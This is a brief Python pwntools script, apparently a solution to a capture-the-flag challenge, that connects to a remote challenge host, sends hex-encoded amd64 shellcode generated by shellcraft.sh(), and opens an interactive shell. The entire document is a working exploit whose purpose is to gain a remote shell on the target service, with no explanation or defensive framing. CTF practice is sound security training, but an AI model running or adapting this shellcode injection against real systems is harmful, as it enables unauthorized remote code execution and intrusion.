from pwn import *
context.arch='amd64'
context.log_level='debug'
__import__('os').environ['PATH']='/usr/bin'
r = remote('challs.actf.co', 31200)
r.recvuntil(b': ')
r.sendline(asm(shellcraft.sh()).hex().encode())
r.interactive()

